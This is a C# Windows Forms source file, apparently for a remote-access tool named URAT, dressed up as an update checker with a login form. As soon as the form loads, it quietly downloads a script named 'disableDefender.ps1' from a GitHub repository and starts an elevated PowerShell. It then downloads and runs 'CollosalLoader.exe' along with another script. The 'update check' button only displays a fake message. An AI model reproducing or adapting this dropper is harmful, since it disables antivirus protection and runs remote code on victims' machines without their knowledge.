using System.Diagnostics;
using System.Net;

namespace URAT
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread.Sleep(TimeSpan.FromSeconds(2));
            MessageBox.Show("No new updates currently available!");
        }

        public static void DownCLoaderPS1()
        {
            string winPath = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

            using (var client = new WebClient())
            {
                client.DownloadFile("https://github.com/FelikzIG/WDT/raw/refs/heads/main/CollosalLoader.exe", winPath + "CollosalLoader.exe");
                client.DownloadFile("https://raw.githubusercontent.com/FelikzIG/WDT/refs/heads/main/execCloader.ps1", winPath + "execCloader.ps1");
            }
        }

        public static void InstallViaPowerShell()
        {
            string winPath = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
            var ps1File = winPath + "disableDefender.ps1";

            using (var client = new WebClient())
            {
                client.DownloadFile("https://raw.githubusercontent.com/FelikzIG/WDT/refs/heads/main/disableDefender.ps1", winPath + "disableDefender.ps1");
            }

            Thread.Sleep(TimeSpan.FromSeconds(5));

            var newProcessInfo = new System.Diagnostics.ProcessStartInfo();
            newProcessInfo.FileName = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
            newProcessInfo.Verb = "runas";
            System.Diagnostics.Process.Start(newProcessInfo);

            newProcessInfo.Arguments = ps1File;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Form2 login = new Form2();

            if (textBox1.Text.Length == 0)
            {
                MessageBox.Show("Fill in all fields.");
            }
            else if (textBox2.Text.Length == 0)
            {
                MessageBox.Show("Fill in all fields.");
            }
            else if (textBox3.Text.Length == 0)
            {
                MessageBox.Show("Fill in all fields.");
            }
            else
            {
                login.Show();
                this.Hide();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            InstallViaPowerShell();
            DownCLoaderPS1();

            Thread.Sleep(TimeSpan.FromSeconds(5));

            string winPath = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
            Process.Start(winPath + "CollosalLoader.exe");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Form2 login = new Form2();
            login.Show();
            this.Hide();
        }
    }
}
